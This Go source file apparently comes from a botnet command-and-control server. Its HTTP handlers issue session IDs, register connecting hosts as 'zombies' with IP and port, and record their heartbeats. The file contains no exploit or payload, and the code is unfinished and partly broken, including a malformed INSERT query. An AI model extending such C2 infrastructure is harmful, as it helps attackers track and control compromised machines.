package main

import (
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"
)

// /////// ROUTES PROCESSING /////////
func HelloWorld(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("Hello World!\n"))
}

func GetSID(w http.ResponseWriter, req *http.Request) {

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	ipHeader := req.RemoteAddr
	sid := createSID(10)
	LogEx(l, ("From " + ipHeader + "=> GET /getSID SID: " + sid), true)
	res := ResGetSID{SessionId: sid, WelcomeMsg: "Welcome aboard:)"}

	jsonData, err := json.Marshal(res)
	if err != nil {
		LogEx(l, ("Error JSON marshalling: " + err.Error()), true)
		w.WriteHeader(http.StatusInternalServerError)

	}
	w.Write([]byte(jsonData))
}

func Register(w http.ResponseWriter, req *http.Request) {
	currentTime := time.Now().Unix()
	body, err := io.ReadAll(req.Body)
	if err != nil {
		LogEx(l, ("Error reading body: " + err.Error()), true)
		w.WriteHeader(http.StatusInternalServerError)
	}
	var reqREG ReqRegister
	err = json.Unmarshal(body, &reqREG)
	if err != nil {
		LogEx(l, ("Error parsing body: " + err.Error()), true)
		w.WriteHeader(http.StatusBadRequest)
	}
	sid := reqREG.SessionId
	country := "US"
	remoteAddr := req.RemoteAddr
	splittedRemoteAddr := strings.Split(remoteAddr, ":")
	ipv4 := splittedRemoteAddr[0]
	port := splittedRemoteAddr[1]
	username := "zombie"
	lastConnTime := currentTime

	query := "INSERT INTO zombies(?,?,?,?,?,?,?)"
	_, err = db.Query(query, sid, ipv4, port, username, country, currentTime, lastConnTime)
	if err != nil {
		LogEx(l, ("Error inserting row: " + err.Error()), true)
		w.WriteHeader(http.StatusInternalServerError)
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
}

func HeartBeat(w http.ResponseWriter, req *http.Request) {
	currentTimeStamp := time.Now().Unix()
	// TODO: CHECK SID VALIDITY
	body, err := io.ReadAll(req.Body)
	if err != nil {
		LogEx(l, ("Error reading body: " + err.Error()), true)
		w.WriteHeader(http.StatusInternalServerError)
	}
	var reqHB ReqHeartBeat
	err = json.Unmarshal(body, &reqHB)
	if err != nil {
		LogEx(l, ("Error parsing body: " + err.Error()), true)
	}

	query := "UPDATE zombies SET lastconntime = ? WHERE sessionid = ?"
	_, err = db.Query(query, currentTimeStamp, reqHB.SessionId)

	w.Header().Set("Content-Type", "application/json; charset=utf-8")

}
